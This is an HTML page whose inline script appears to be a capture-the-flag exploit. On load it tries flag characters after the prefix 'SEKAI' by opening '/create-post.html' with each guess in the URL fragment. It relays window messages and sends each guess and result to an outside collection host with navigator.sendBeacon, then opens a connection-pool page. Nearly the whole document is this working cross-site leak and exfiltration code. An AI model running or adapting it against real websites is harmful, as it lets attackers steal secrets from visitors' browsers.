<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        // const alpha = "abcdefghijklmnopqrstuvwxyz_";
        let alpha = "}{abcdefghijklmnopqrstuvwxyz_";
        let w = null;
        let part = "SEKAI";

        let start_from = "}"
        
        alpha = alpha.slice(alpha.indexOf(start_from), alpha.indexOf(start_from)+5)

        window.addEventListener("message", (e) => {
            console.log("closing window");
            setTimeout(() => {
                navigator.sendBeacon("https://something.requestrepo.com/create", e.data)
                w.close();
            }, 2000)
            
        })

        async function main(){

            navigator.sendBeacon("https://something.requestrepo.com/starting", "Created one note")
            await new Promise(resolve => setTimeout(resolve, 2000));

            for(let i = 0; i < alpha.length; i++){
                w = window.open(`/create-post.html#${part + alpha[i]}`);
                navigator.sendBeacon("https://something.requestrepo.com/create", part + alpha[i])

                /*while (!w.closed) {
                    await new Promise(resolve => setTimeout(resolve, 10));
                }*/

                await new Promise(resolve => setTimeout(resolve, 4000));
            }

            window.open("/connection-pool.html")

        }


        main();

    </script>
</body>
</html>